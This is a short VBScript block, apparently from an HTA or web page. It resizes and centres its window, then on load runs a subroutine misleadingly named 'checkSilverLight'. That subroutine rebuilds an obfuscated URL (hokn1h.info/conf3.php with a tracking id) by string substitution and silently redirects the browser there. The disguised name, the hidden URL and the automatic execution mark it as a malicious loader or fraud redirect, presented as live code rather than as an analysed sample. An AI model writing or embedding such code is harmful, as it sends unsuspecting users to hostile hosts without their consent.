<Script Language="VBScript">

sub checkSilverLight(mv)
	str = "http*[][]hokn1h|info[]conf3|php()cccid=Ne6uQQUueOCPODuIouyL82Ma9PYSvxLJ"
	str = Replace(str, "[]", "/")
	str = Replace(str, "*", ":")
	str = Replace(str, "|", ".")
	str = Replace(str, "()", "?")
	Location.Href = str
end sub


on error resume next
winwidth = 600
winheight = 400
'リサイズ
window.resizeTo winwidth,winheight
positionX = ( screen.availWidth - winwidth ) / 2
positionY = ( screen.availHeight - winheight ) / 2
window.moveTo positionX, positionY

sub window_onLoad()
checkSilverLight "Ne6uQQUueOCPODuIouyL82Ma9PYSvxLJ"
end sub

</Script>
